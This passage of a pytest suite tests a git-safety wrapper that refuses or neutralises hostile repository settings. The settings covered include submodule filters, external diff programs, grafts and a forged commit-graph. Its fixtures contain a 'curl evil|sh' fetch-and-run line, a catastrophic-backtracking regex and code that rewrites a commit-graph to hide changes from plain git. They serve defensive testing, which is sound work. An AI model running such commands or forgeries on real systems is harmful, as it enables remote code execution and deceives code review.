    w.git(w.tmp, "init", "-q", "-b", "main", str(top))
    (top / "tickets" / "X" / "ticket.json").write_text("BENIGN at top\n")
    (top / "ws" / "tickets" / "X" / "ticket.json").write_text("HOSTILE ORCH_GRANT=secret in workspace\n")
    w.git(top, "add", "-A")
    ws, caps = top / "ws", Capabilities.direct()
    raw = health._git(ws, "staged_raw", caps=caps)
    rel = raw.split(b"\0")[1].decode()
    assert rel == "tickets/X/ticket.json"
    assert health._git(ws, "staged_blob", caps=caps, path=rel) == b"HOSTILE ORCH_GRANT=secret in workspace\n"
    for bad in ("../tickets/X/ticket.json", "tickets/../../x", ".."):
        with pytest.raises(gitsafe.Unsafe):
            gitsafe.command(str(ws), "staged_blob", os.environ, operand=bad)
        assert health._git(ws, "staged_blob", caps=caps, path=bad) is None


def _super_with_armed_submodule(w) -> tuple[Path, Path]:
    """A superproject ``r`` with a subdirectory ``d`` and a committed, populated submodule ``sub`` whose own config
    arms a clean filter and an fsmonitor program (``_populated_submodule``)."""
    repo = make_repo(w, "r")
    (repo / "d").mkdir()
    (repo / "d" / "x").write_text("x\n")
    sub = _populated_submodule(w, repo)
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "with sub")
    return repo, sub


def test_the_submodule_refusal_covers_the_whole_repo_even_from_a_subdirectory(world):
    """M2 (probe 3): a repo path pointing into a subdirectory must not skip the populated-submodule refusal, or a
    dirty checked-out submodule elsewhere would read as clean."""
    w = world
    repo, sub = _super_with_armed_submodule(w)
    w.control(repo, "status", "--porcelain", fires=["sub-clean", "sub-fsmonitor"])  # the submodule's config runs
    w.clear()
    assert observe.dirty(repo) is None
    assert observe.dirty(repo / "d") is None  # refused from the subdirectory too, never "" (clean)
    with pytest.raises(gitsafe.Unsafe, match="submodule"):
        gitsafe.submodules(str(repo / "d"), os.environ)
    assert w.fired() == set()


def test_a_staged_pointer_move_outside_the_subdirectory_still_counts(world):
    w = world
    repo, sub = _super_with_armed_submodule(w)
    w.git(sub, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "move")
    w.git(repo, "add", "sub")  # a staged pointer move
    shutil.rmtree(sub)
    sub.mkdir()  # unpopulated now
    w.clear()
    got = observe.dirty(repo / "d")
    assert got is not None and "staged submodule change: sub" in got.splitlines()
    assert w.fired() == set()


def test_a_pointer_move_between_commits_is_visible_and_runs_nothing(world):
    """L1: diffs between two commits never open a submodule, so they keep ``--ignore-submodules=dirty`` and show the
    pointer move (``=all`` hid it from the dashboard's diff)."""
    w = world
    repo, sub = _super_with_armed_submodule(w)
    before = observe.git(repo, "commit", rev="refs/heads/main")
    w.git(sub, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "move")
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "bump sub")
    after = observe.git(repo, "commit", rev="refs/heads/main")
    w.clear()
    assert "sub" in observe.git(repo, "diff_names", rev=(before, after)).split()
    assert "sub" in observe.git(repo, "diff_numstat", rev=(before, after))
    assert "Subproject commit" in observe.git(repo, "diff_patch", rev=("3", before, after))
    assert w.fired() == set()


@pytest.mark.parametrize("operand", [5, 3.0, b"refs/heads/main", ["refs/heads/main"], {"x": 1}, object()])
def test_an_operand_of_the_wrong_type_is_refused_not_a_type_error(world, operand):
    repo = make_repo(world, "r")
    with pytest.raises(gitsafe.Unsafe):
        gitsafe.command(str(repo), "ref", os.environ, operand=operand)
    assert observe.git(repo, "ref", rev=operand) is None


# ------------------------------ Codex on 0a887514: an operation's fixed options are the only source of its behaviour


def _bumped_submodule(w) -> tuple[Path, str, str]:
    """A superproject whose second commit only moves its submodule's pointer; the submodule's own config arms a
    textconv, an external diff and an fsmonitor program."""
    repo, sub = _super_with_armed_submodule(w)
    (sub / ".gitattributes").write_text("*.g diff=x\n")
    w.git(sub, "config", "diff.x.textconv", w.prog("sub-textconv"))
    w.git(sub, "config", "diff.external", w.prog("sub-external"))
    before = observe.git(repo, "commit", rev="refs/heads/main")
    w.git(sub, "add", "-A")
    w.git(sub, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "move")
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "bump sub")
    after = observe.git(repo, "commit", rev="refs/heads/main")
    w.clear()
    return repo, before, after


def test_an_allowed_looking_diff_submodule_never_opens_a_submodule(world, monkeypatch):
    w = world
    repo, before, after = _bumped_submodule(w)
    # positive control: a child diff runs inside the submodule (its external diff wins over its textconv)
    w.control(repo, "-c", "diff.submodule=diff", "diff", before, after, fires=["sub-external"])
    w.clear()
    w.git(repo, "config", "diff.submodule", "diff")  # tolerated by the gate (orch-52): neutralised, not refused
    gitsafe.gate(str(repo), os.environ)
    for op, operand in (("diff_patch", ("3", before, after)), ("diff_names", (before, after)),
                        ("diff_numstat", (before, after))):  # fmt: skip
        out = observe.git(repo, op, rev=operand)
        assert out is not None and "sub" in out, op
    assert "Subproject commit" in observe.git(repo, "diff_patch", rev=("3", before, after))
    assert w.fired() == set()


def test_diff_relative_never_hides_a_staged_gitlink_outside_the_subdirectory(world, monkeypatch):
    w = world
    repo, sub = _super_with_armed_submodule(w)
    w.git(sub, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "move")
    w.git(repo, "add", "sub")
    shutil.rmtree(sub)
    sub.mkdir()
    w.git(repo, "config", "diff.relative", "true")
    plain = w.git(repo / "d", "diff", "--cached", "--raw").stdout
    assert "sub" not in plain  # positive control: the config hides it in plain git
    w.clear()
    gitsafe.gate(str(repo), os.environ)  # tolerated (orch-52): neutralised by --no-relative, not refused
    got = observe.dirty(repo / "d")  # --no-relative still shows the whole repository
    assert got is not None and "staged submodule change: sub" in got.splitlines()
    assert w.fired() == set()


@pytest.mark.parametrize("name", ["a.lock/b", "x/y.lock/z", "a.lock"])
def test_lock_is_refused_at_the_end_of_every_component(world, name):
    repo = make_repo(world, "r")
    with pytest.raises(gitsafe.Unsafe):
        gitsafe.command(str(repo), "ref", os.environ, operand=f"refs/heads/{name}")


def test_a_lock_inside_a_component_is_fine(world):
    w = world
    repo = make_repo(w, "r")
    w.git(repo, "branch", "a.locks/b.lockx")
    assert observe.git(repo, "ref", rev="refs/heads/a.locks/b.lockx") is not None


# --------------------------- orch-52 on #561: diff.* is tolerated by the gate and neutralised by every operation

#: every diff knob of the repo's own config that can run a program or change output, at a hostile value
HOSTILE_DIFF = {
    "diff.external": "{diff-external}", "diff.x.command": "{diff-command}", "diff.x.textconv": "{diff-textconv}",
    "diff.x.cachetextconv": "true", "diff.x.binary": "true", "diff.x.xfuncname": "^(.*)$",
    "diff.x.funcname": "^(.*)$", "diff.x.wordRegex": ".", "diff.lfs.textconv": "{lfs-textconv}",
    "diff.submodule": "log", "diff.relative": "true", "diff.renames": "copies", "diff.noprefix": "true",
    "diff.mnemonicPrefix": "true", "diff.srcPrefix": "X/", "diff.dstPrefix": "Y/", "diff.algorithm": "histogram",
    "diff.indentHeuristic": "false", "diff.context": "0", "diff.interHunkContext": "10", "color.ui": "always",
    "color.diff": "always",
}  # fmt: skip


def _diff_repo(w, where: str) -> tuple[Path, str, str]:
    """A repo with a diff that every knob above changes: blank-line runs, a rename, a gitlink move, a subdirectory,
    a ``*.g diff=x`` attribute, a staged change and a work-tree change. Fixed dates: the same ids everywhere."""
    base = w.tmp / where
    base.mkdir()
    repo = base / "r"
    w.git(base, "init", "-q", "-b", "main", str(repo))
    commit = ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m"]
    (repo / "a.g").write_text("one\n\n\nfoo\n\nbar\n" + "".join(f"line {i}\n" for i in range(30)))
    (repo / "b.txt").write_text("bee\n")
    (repo / "d").mkdir()
    (repo / "d" / "x").write_text("x\n")
    (repo / "old.txt").write_text("l1\nl2\nl3\nl4\nl5\n")
    (repo / ".gitattributes").write_text("*.g diff=x\n*.l diff=lfs\n")
    (repo / "big.l").write_text("lfs pointer 1\n")
    w.git(repo, "add", "-A")
    w.git(repo, "update-index", "--add", "--cacheinfo", f"160000,{'1' * 40},sub")
    w.git(repo, *commit, "c1")
    c1 = w.git(repo, "rev-parse", "HEAD").stdout.strip()
    (repo / "a.g").write_text("one\n\nfoo\n\n\nbar\nbaz\n" + "".join(f"line {i}\n" for i in range(30) if i != 15))
    (repo / "d" / "x").write_text("y\n")
    (repo / "big.l").write_text("lfs pointer 2\n")
    w.git(repo, "mv", "old.txt", "new.txt")
    with (repo / "new.txt").open("a") as f:
        f.write("l6\n")
    w.git(repo, "add", "a.g", "d/x", "new.txt", "big.l")  # not -A: the gitlink has no directory and must stay
    w.git(repo, "update-index", "--cacheinfo", f"160000,{'2' * 40},sub")
    w.git(repo, *commit, "c2")
    c2 = w.git(repo, "rev-parse", "HEAD").stdout.strip()
    (repo / "b.txt").write_text("bee2\n")
    w.git(repo, "add", "b.txt")
    w.git(repo, "update-index", "--cacheinfo", f"160000,{'3' * 40},sub")  # a staged pointer move
    (repo / "a.g").write_text("work tree\n")
    w.clear()
    return repo, c1, c2


def _every_operation_bytes(repo: Path, c1: str, c2: str) -> dict:
    out = {}
    for where in (repo, repo / "d"):
        for op, spec in gitsafe.OPS.items():
            sample = {"rev": c2, "path": "x" if where.name == "d" else "b.txt", "context": "3"}
            operand = tuple(sample[k] for k in spec.operands) or None
            if op in ("diff_numstat", "diff_names", "merge_base"):
                operand = (c1, c2)
            elif op == "diff_patch":
                operand = ("3", c1, c2)
            argv, env = gitsafe.command(str(where), op, os.environ, operand=operand)
            done = subprocess.run(argv, env=env, cwd="/", capture_output=True, stdin=subprocess.DEVNULL, timeout=60)
            text = done.stdout.replace(os.fsencode(os.path.realpath(repo)), b"<r>")
            if op == "diff_patch":  # what observe.git returns for it: hunk headers without repo-chosen text
                text = gitsafe.plain_hunk_headers(text.decode("utf-8", "surrogateescape")).encode(
                    "utf-8", "surrogateescape"
                )
            out[(where.name, op)] = (done.returncode, text)
    return out


def test_every_hostile_diff_key_is_neutralised_byte_for_byte(world):
    w = world
    clean, c1, c2 = _diff_repo(w, "clean")
    hostile, h1, h2 = _diff_repo(w, "hostile")
    assert (c1, c2) == (h1, h2)
    (w.tmp / "order").write_text("new.txt\nsub\n*\n")
    for k, v in HOSTILE_DIFF.items():
        value = str(w.tmp / "order") if v == "{order}" else w.prog(v.strip("{}")) if v.startswith("{") else v
        w.git(hostile, "config", k, value)
    # positive controls: plain git runs every program and its output differs from the clean repo's
    w.control(hostile, "diff", c1, c2, fires=["diff-external", "diff-command"])
    # One run per file. Root cause of the earlier CI no-fire: diff.x.cachetextconv=true makes git write a notes
    # commit, which needs an identity; without one git stopped (rc 128) before it reached big.l. Every plain run
    # now has one (IDENTITY), and the controls check rc and each marker.
    w.control(hostile, "diff", "--no-ext-diff", c1, c2, "--", "a.g", fires=["diff-textconv"])
    w.control(hostile, "diff", "--no-ext-diff", c1, c2, "--", "big.l", fires=["lfs-textconv"])
    w.clear()
    for args in (["diff", "--no-ext-diff", "--no-textconv", c1, c2], ["diff", "--numstat", c1, c2]):
        assert w.git(hostile, *args).stdout != w.git(clean, *args).stdout, args
    w.clear()
    gitsafe.gate(str(hostile), os.environ)  # tolerated, not refused
    want, got = _every_operation_bytes(clean, c1, c2), _every_operation_bytes(hostile, c1, c2)
    assert {k: (want[k], got[k]) for k in want if want[k] != got[k]} == {}
    assert want[("r", "diff_patch")][0] == 0 and b"diff --git a/a.g b/a.g" in want[("r", "diff_patch")][1]
    assert w.fired() == set()


@pytest.mark.parametrize(
    "key,value",
    [("diff.someFutureKey", "x"), ("diff.colorMoved", "zebra"), ("diff.orderFile", "/tmp/o"),
     ("diff.ignoreSubmodules", "all"), ("diff.x.someFutureKey", "x"), ("diff.suppressBlankEmpty", "true")],
)  # fmt: skip
def test_a_diff_key_outside_the_closed_list_is_refused_by_name(world, key, value):
    w = world
    repo = make_repo(w, "r")
    w.git(repo, "config", key, value)
    with pytest.raises(gitsafe.Unsafe) as e:
        gitsafe.gate(str(repo), os.environ)
    # git lists keys lower-cased (the subsection keeps its case)
    named = key.lower() if key.count(".") == 1 else f"diff.x.{key.rsplit('.', 1)[1].lower()}"
    assert e.value.reason == f"this repo sets {named}, which orch doesn't support yet; remove it or tell us"
    assert value not in e.value.reason or value == "x"
    assert observe.head(repo) is None


def test_git_lfs_diff_textconv_is_tolerated_and_never_runs(world):
    w = world
    repo = make_repo(w, "r", attrs="*.g diff=lfs\n")
    w.git(repo, "config", "diff.lfs.textconv", w.prog("lfs-textconv"))
    w.control(repo, "diff", "--no-ext-diff", fires=["lfs-textconv"])  # the work-tree change of a.g
    w.clear()
    gitsafe.gate(str(repo), os.environ)
    assert observe.dirty(repo) is not None and run_all("health", repo)["staged_raw"] is not None
    head = observe.head(repo)
    assert observe.git(repo, "diff_patch", rev=("3", head, head)) == ""
    assert w.fired() == set()


def test_hunk_headers_carry_no_repo_chosen_text(world):
    w = world
    repo = make_repo(w, "r", attrs="*.g diff=x\n")
    w.git(repo, "config", "diff.x.xfuncname", "^(.*)$")
    (repo / "a.g").write_text("".join(f"line {i}\n" for i in range(40)))
    w.git(repo, "add", "a.g")
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "long")
    (repo / "a.g").write_text("".join(f"line {i}\n" if i != 30 else "changed\n" for i in range(40)))
    w.git(repo, "add", "a.g")
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "c2")
    c2 = observe.head(repo)
    c1 = observe.git(repo, "parent", rev=c2)
    plain = w.git(repo, "diff", c1, c2).stdout
    assert any(ln.startswith("@@") and not ln.endswith("@@") for ln in plain.splitlines())  # positive control
    patch = observe.git(repo, "diff_patch", rev=("3", c1, c2))
    assert patch and all(ln.endswith("@@") for ln in patch.splitlines() if ln.startswith("@@"))


# ------------------------------------------------------------------------- final Opus delta on #561: false cleans


@pytest.mark.parametrize("how", ["file", "deleted"])
def test_a_gitlink_path_replaced_or_deleted_is_not_clean(world, how):
    """MA: status runs --ignore-submodules=dirty, so a gitlink path that is now a file, or gone, shows."""
    w = world
    repo = make_repo(w, "r")
    w.git(repo, "update-index", "--add", "--cacheinfo", f"160000,{'1' * 40},sub")
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "gitlink")
    w.git(repo, "reset", "-q", "--hard")
    if (repo / "sub").is_dir():
        (repo / "sub").rmdir()  # git leaves an empty directory for an unpopulated gitlink
    if how == "file":
        (repo / "sub").write_text("not a submodule\n")
    plain = w.git(repo, "status", "--porcelain").stdout
    assert "sub" in plain  # positive control
    got = observe.dirty(repo)
    assert got is not None and "sub" in got
    assert w.fired() == set()


def test_a_flagged_file_outside_the_subdirectory_is_still_seen(world):
    """MB: index_flags lists the whole repository, from a subdirectory too."""
    w = world
    repo = make_repo(w, "r")
    (repo / "d").mkdir()
    (repo / "d" / "x").write_text("x\n")
    w.git(repo, "add", "d/x")
    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "d")
    w.git(repo, "update-index", "--skip-worktree", "b.txt")
    got = observe.dirty(repo / "d")
    assert got is not None and "hidden change flag: b.txt" in got.splitlines()


def _three_commits(w) -> tuple[Path, str, str, str]:
    repo = make_repo(w, "r")
    w.git(repo, "reset", "-q", "--hard")
    out = []
    for text in ("x = 1\n", "x = 2  # benign\n", "x = 2\nimport os; os.system('curl evil|sh')\n"):
        (repo / "code.py").write_text(text)
        w.git(repo, "add", "code.py")
        w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", text[:5])
        out.append(w.git(repo, "rev-parse", "HEAD").stdout.strip())
    return repo, *out


def test_grafts_never_shift_the_base_of_a_review(world):
    """MC: info/grafts could make c3's parent c1; GIT_GRAFT_FILE=/dev/null keeps the true parent."""
    w = world
    repo, c1, c2, c3 = _three_commits(w)
    (repo / ".git" / "info").mkdir(exist_ok=True)
    (repo / ".git" / "info" / "grafts").write_text(f"{c3} {c1}\n")
    assert w.git(repo, "rev-parse", f"{c3}^1").stdout.strip() == c1  # positive control
    assert observe.git(repo, "parent", rev=c3) == c2
    assert observe.git(repo, "merge_base", rev=(c3, c2)) == c2


def test_a_forged_commit_graph_never_changes_the_reviewed_tree(world):
    """MC: a commit-graph whose entry for c3 names c2's tree; core.commitGraph=false reads the real commit."""
    import hashlib
    import struct

    w = world
    repo, c1, c2, c3 = _three_commits(w)
    honest = observe.git(repo, "diff_patch", rev=("1", c2, c3))
    benign = w.git(repo, "rev-parse", f"{c2}^{{tree}}").stdout.strip()
    w.git(repo, "commit-graph", "write", "--reachable")
    path = repo / ".git" / "objects" / "info" / "commit-graph"
    data = bytearray(path.read_bytes())
    chunks = {}
    for i in range(data[6] + 1):
        cid, off = struct.unpack(">4sQ", data[8 + 12 * i : 20 + 12 * i])
        chunks[cid] = off
    count = (chunks[b"CDAT"] - chunks[b"OIDL"]) // 20
    oids = [bytes(data[chunks[b"OIDL"] + 20 * i : chunks[b"OIDL"] + 20 * i + 20]).hex() for i in range(count)]
    at = chunks[b"CDAT"] + 36 * oids.index(c3)
    data[at : at + 20] = bytes.fromhex(benign)
    data[-20:] = hashlib.sha1(bytes(data[:-20])).digest()
    path.chmod(0o644)
    path.write_bytes(bytes(data))
    assert w.git(repo, "diff", c2, c3).stdout == ""  # positive control: plain git believes the forged graph
    assert observe.git(repo, "diff_patch", rev=("1", c2, c3)) == honest and "curl evil" in honest


def test_trustctime_and_checkstat_never_hide_a_same_size_change(world):
    """L1: the stat checks are pinned at git's defaults."""
    w = world
    repo = make_repo(w, "r")
    w.git(repo, "reset", "-q", "--hard")
    f = repo / "b.txt"
    past = f.stat().st_mtime_ns - 100 * 10**9
    os.utime(f, ns=(past, past))
    w.git(repo, "update-index", "--refresh")
    import time

    time.sleep(1.1)  # this git compares whole seconds of ctime
    f.write_text("bad\n")  # same size as "bee\n"
    os.utime(f, ns=(past, past))
    w.git(repo, "config", "core.trustctime", "false")
    w.git(repo, "config", "core.checkStat", "minimal")
    assert "b.txt" not in w.git(repo, "--no-optional-locks", "status", "--porcelain").stdout  # positive control
    assert "b.txt" in observe.porcelain(repo)


def test_big_file_threshold_never_turns_the_review_into_binary(world):
    """L2: --text on diff_patch."""
    w = world
    repo, c1, c2, c3 = _three_commits(w)
    w.git(repo, "config", "core.bigFileThreshold", "1")
    assert "Binary files" in w.git(repo, "diff", c2, c3).stdout  # positive control
    patch = observe.git(repo, "diff_patch", rev=("3", c2, c3))
    assert "Binary files" not in patch and "curl evil" in patch


# ----------------------------------------------------------- final Opus delta on 31717986 (R7): regex, driver "", notes

#: probe 14: a POSIX BRE with backreferences that backtracks exponentially on lines like "aaaa…ab"
REDOS = r"^\(\(a*\)*\)*\2\2c"


def _redos_repo(w, where: str) -> tuple[Path, str, str]:
    base = w.tmp / where
    base.mkdir()
    repo = base / "r"
    w.git(base, "init", "-q", "-b", "main", str(repo))
    (repo / ".gitattributes").write_text("*.g diff=x\n")
    head = ("a" * 28 + "b\n") * 3
    (repo / "f.g").write_text(head + "".join(f"line {i}\n" for i in range(20)))
    w.git(repo, "add", "-A")
    w.git(repo, "commit", "-qm", "1")
    (repo / "f.g").write_text(head + "".join(f"line {i}\n" for i in range(20) if i != 15))
    w.git(repo, "commit", "-qam", "2")
    c2 = w.git(repo, "rev-parse", "HEAD").stdout.strip()
    return repo, w.git(repo, "rev-parse", "HEAD~1").stdout.strip(), c2


def _raw_hunk_headers(repo: Path, c1: str, c2: str) -> list[str]:
    """The hunk headers of orch's OWN ``diff_patch`` argv and environment, run raw: no ``plain_hunk_headers``, so
    what git itself honoured is visible."""
    argv, env = gitsafe.command(str(repo), "diff_patch", os.environ, operand=("3", c1, c2))
    done = subprocess.run(argv, env=env, cwd="/", capture_output=True, text=True, stdin=subprocess.DEVNULL, timeout=30)
    assert done.returncode == 0, done.stderr
    return [ln for ln in done.stdout.splitlines() if ln.startswith("@@")]


def test_the_funcname_pins_are_honoured_by_git_itself(world, monkeypatch):
    """R7-M1 / Opus R8-L1, platform-independent: with a benign repo funcname ``^\\(a*b\\)$``, plain git puts its
    match in the hunk header; orch's own argv and environment, run WITHOUT the header stripping, give bare headers
    (the pins are honoured by git); with the funcname pins removed, the same raw run carries the match again."""
    w = world
    repo, h1, h2 = _redos_repo(w, "r")
    w.git(repo, "config", "diff.x.funcname", r"^\(a*b\)$")
    match = "a" * 28 + "b"
    plain = [ln for ln in w.git(repo, "diff", h1, h2).stdout.splitlines() if ln.startswith("@@")]
    assert plain and all(ln.endswith(match) for ln in plain), plain  # positive control
    pinned = _raw_hunk_headers(repo, h1, h2)
    assert pinned and all(ln.endswith("@@") for ln in pinned), pinned
    real = gitsafe._driver_pins
    monkeypatch.setattr(gitsafe, "_driver_pins", lambda local: [(k, v) for k, v in real(local) if "funcname" not in k])
    assert all(ln.endswith(match) for ln in _raw_hunk_headers(repo, h1, h2))  # the mutant shows the match


def test_a_builtin_driver_is_pinned_too(world):
    """Opus R8 I1: a built-in driver (selected by an attribute, no repo config) is pinned like the repo's own."""
    w = world
    repo, h1, h2 = _redos_repo(w, "r")
    (repo / ".gitattributes").write_text("*.g diff=cpp\n")
    _argv, env = gitsafe.command(str(repo), "diff_patch", os.environ, operand=("3", h1, h2))
    pins = {(env[f"GIT_CONFIG_KEY_{i}"], env[f"GIT_CONFIG_VALUE_{i}"]) for i in range(int(env["GIT_CONFIG_COUNT"]))}
    assert {("diff.cpp.xfuncname", "^$"), ("diff.cpp.funcname", "^$"), ("diff.cpp.binary", "false")} <= pins
    assert all(ln.endswith("@@") for ln in _raw_hunk_headers(repo, h1, h2))


def test_a_backtracking_funcname_never_stalls_the_review_patch(world):
    """R7-M1 (probe 14): the repo's backtracking funcname never runs; the patch comes back at once and equals a clean
    repo's. On macOS plain git stalls on it (positive control); glibc's regex does not stall on this pattern."""
    import sys
    import time

    w = world
    clean, c1, c2 = _redos_repo(w, "clean")
    repo, h1, h2 = _redos_repo(w, "hostile")
    assert (c1, c2) == (h1, h2)
    w.git(repo, "config", "diff.x.funcname", REDOS)
    if sys.platform == "darwin":
        with pytest.raises(subprocess.TimeoutExpired):
            subprocess.run(["git", "-C", str(repo), "diff", h1, h2], env=w.env(w.empty), capture_output=True, timeout=5)
    started = time.monotonic()
    got = observe.git(repo, "diff_patch", rev=("3", h1, h2))
    assert time.monotonic() - started < 5
    assert got is not None and got == observe.git(clean, "diff_patch", rev=("3", c1, c2))


def test_an_empty_driver_name_is_refused_and_the_algorithm_is_pinned(world, monkeypatch):
    """R7-L1 (probe 13): ``[diff ""] algorithm`` is the driver ``""`` (an empty ``diff=`` attribute selects it), not
    the top-level ``diff.algorithm``: the gate refuses it by name; and ``--diff-algorithm=default`` beats it even past
    the gate."""
    import random

    w = world
    random.seed(3)
    base = w.tmp / "probe13"
    base.mkdir()
    while True:  # two files where myers and patience differ
        a = "".join(random.choice("ab}{\n") for _ in range(30)).replace("\n\n", "\nx\n") + "\n"
        b = "".join(random.choice("ab}{\n") for _ in range(30)).replace("\n\n", "\nx\n") + "\n"
        (base / "f.c").write_text(a)
        (base / "g.c").write_text(b)
        algo = ["git", "diff", "--no-index", "--diff-algorithm={}", "f.c", "g.c"]
        outs = {
            x: subprocess.run([*algo[:3], algo[3].format(x), *algo[4:]], cwd=base, capture_output=True).stdout
            for x in ("myers", "patience")
        }  # fmt: skip
        if outs["myers"] != outs["patience"]:
            break

    def build(where: str) -> tuple[Path, str, str]:
        repo = w.tmp / where
        w.git(w.tmp, "init", "-q", "-b", "main", str(repo))
        (repo / "f.c").write_text(a)
        w.git(repo, "add", "f.c")
        w.git(repo, "commit", "-qm", "1")
        (repo / "f.c").write_text(b)
        w.git(repo, "commit", "-qam", "2")
        return repo, *(w.git(repo, "rev-parse", r).stdout.strip() for r in ("HEAD~1", "HEAD"))

    clean, c1, c2 = build("clean")
    repo, h1, h2 = build("hostile")
    (repo / ".git" / "info").mkdir(exist_ok=True)
    (repo / ".git" / "info" / "attributes").write_text("*.c diff=\n")
    w.git(repo, "config", "diff..algorithm", "patience")
    assert w.git(repo, "diff", h1, h2).stdout != w.git(clean, "diff", c1, c2).stdout  # positive control
    with pytest.raises(gitsafe.Unsafe, match=r"diff\.\.algorithm"):
        gitsafe.gate(str(repo), os.environ)
    assert observe.git(repo, "diff_patch", rev=("3", h1, h2)) is None
    monkeypatch.setattr(gitsafe, "gate", lambda *a, **k: [])  # past the gate, the option still decides
    assert observe.git(repo, "diff_patch", rev=("3", h1, h2)) == observe.git(clean, "diff_patch", rev=("3", c1, c2))


def _snapshot(repo: Path) -> dict[str, tuple[int, int, str]]:
    """Every file under ``.git``: size, mtime (ns) and sha256 (Opus R8 I2: an index or reflog write shows too)."""
    import hashlib

    out = {}
    for p in sorted((repo / ".git").rglob("*")):
        if p.is_file() and not p.is_symlink():
            st = p.stat()
            out[str(p.relative_to(repo))] = (st.st_size, st.st_mtime_ns, hashlib.sha256(p.read_bytes()).hexdigest())
    return out


def test_cachetextconv_never_makes_an_orch_read_write_a_notes_commit(world):
    """``diff.<d>.cachetextconv=true`` makes git WRITE a notes commit (refs/notes/textconv/<d>) during a diff. Every
    orch diff runs with --no-textconv, so no textconv and no cache, and no orch read writes anything: every file
    under ``.git`` (refs, objects, index, logs) is byte- and mtime-identical afterwards."""
    w = world
    repo, c1, c2 = _diff_repo(w, "r")
    w.git(repo, "config", "diff.x.textconv", w.prog("diff-textconv"))
    w.git(repo, "config", "diff.x.cachetextconv", "true")
    for f in ("b.txt", "d/x"):  # stat-dirty, same content: a refreshing status would rewrite the index
        st = (repo / f).stat()
        os.utime(repo / f, ns=(st.st_atime_ns, st.st_mtime_ns + 5 * 10**9))
    before = _snapshot(repo)
    _every_operation_bytes(repo, c1, c2)
    for op in ("diff_patch", "diff_numstat", "diff_names"):
        operand = ("3", c1, c2) if op == "diff_patch" else (c1, c2)
        assert observe.git(repo, op, rev=operand) is not None
    assert observe.dirty(repo) is not None and run_all("health", repo)["staged_raw"] is not None
    assert _snapshot(repo) == before and w.count("diff-textconv") == 0
    # positive controls: plain status rewrites the index; the same diff in plain git runs the textconv and writes
    # the notes commit
    w.control(repo, "status", "--porcelain", fires=[])
    assert _snapshot(repo) != before
    before = _snapshot(repo)
    w.control(repo, "diff", c1, c2, "--", "a.g", fires=["diff-textconv"])
    assert "refs/notes/textconv/x" in w.git(repo, "for-each-ref").stdout and _snapshot(repo) != before


# ------------------------------------------------- R7-M1: a diff git cannot produce is "unavailable", never empty


def _timeout_for(monkeypatch, marker: str):
    """``subprocess.run`` raises TimeoutExpired for any git argv containing ``marker`` (as the 30 s limit would)."""
    real = subprocess.run

    def run(argv, *a, **k):
        if isinstance(argv, list) and argv[:1] == ["git"] and marker in argv:
            raise subprocess.TimeoutExpired(argv, 30)
        return real(argv, *a, **k)

    monkeypatch.setattr(subprocess, "run", run)


def test_observe_dirty_is_unknown_when_its_diff_times_out(world, monkeypatch):
    repo = make_repo(world, "r")
    assert observe.dirty(repo) is not None
    _timeout_for(monkeypatch, "--no-relative")  # staged_tree
    assert observe.dirty(repo) is None  # unknown, never "clean"


def test_observe_diff_operations_answer_none_when_they_time_out(world, monkeypatch):
    repo, c1, c2 = _diff_repo(world, "r")
    _timeout_for(monkeypatch, "--end-of-options")
    for op, operand in (("diff_patch", ("3", c1, c2)), ("diff_numstat", (c1, c2)), ("diff_names", (c1, c2))):
        assert observe.git(repo, op, rev=operand) is None, op  # None, never "" (an empty diff)


def test_tree_dirty_is_unknown_when_its_diff_times_out(world, monkeypatch):
    from orch.runner import wtgit

    w = world
    repo = make_repo(w, "r")
    own = dict(os.environ)
    assert wtgit.tree_dirty(str(repo), own) is not None
    real = subprocess.Popen

    def popen(argv, *a, **k):  # the staged_tree diff never finishes in time
        if isinstance(argv, list) and "--no-relative" in argv:
            argv = ["sleep", "5"]
        return real(argv, *a, **k)

    monkeypatch.setattr(subprocess, "Popen", popen)
    monkeypatch.setitem(wtgit.read_git.__kwdefaults__, "timeout", 0.5)
    assert wtgit.tree_dirty(str(repo), own) is None


@pytest.mark.parametrize("marker,what", [("--relative", "git cannot list the staged files here"),
                                         ("cat-file", "git cannot read the staged file")])  # fmt: skip
def test_check_staged_says_git_is_unavailable_when_its_diff_times_out(world, monkeypatch, ws, marker, what):
    repo = make_repo(world, "r")
    _timeout_for(monkeypatch, marker)
    store = ws.other()
    try:
        found = health.check_staged(store, repo, Capabilities.direct())
    finally:
        store.close()
    assert [f.code for f in found] == ["git.unavailable"] and found[0].what == what
